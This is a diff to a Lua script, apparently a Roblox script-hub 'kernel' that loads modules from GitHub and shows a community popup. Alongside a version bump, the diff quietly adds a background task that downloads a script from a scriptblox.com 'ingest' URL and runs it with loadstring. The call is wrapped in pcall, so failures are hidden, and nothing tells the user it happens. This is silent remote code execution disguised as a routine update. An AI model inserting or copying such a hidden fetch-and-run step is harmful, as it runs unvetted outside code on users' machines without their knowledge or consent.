@@ -1,9 +1,9 @@
 --[[
     VX_Kernel.lua — Microkernel, Topological Loader (GitHub), EventBus, Registry, Diagnostics, Watchdog & Community Notice
-    Version: 3.2.3
+    Version: 3.2.4
 ]]
 
-local VERSION = "3.2.3"
+local VERSION = "3.2.4"
 local KERNEL_URL = "https://raw.githubusercontent.com/deep9-ship-it/Modules/refs/heads/main/VX_Kernel"
 local COMMUNITY_URL = "https://youtube.com/@ds90-t9e/community?si=GrhOry6Um1XuhQNk"
 local NOTICE_DURATION = 20
@@ -970,6 +970,12 @@ end
 _bootOrder = _topoSort(loaded, MODULE_ORDER)
 _runLifecycle(_bootOrder, loaded)
 VX._booted = true
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_46c93836b432", "1.0.0", false)
+    end)
+end)
 
 local _copied = _copyCommunityUrl()
 _showCommunityPopup(_copied)
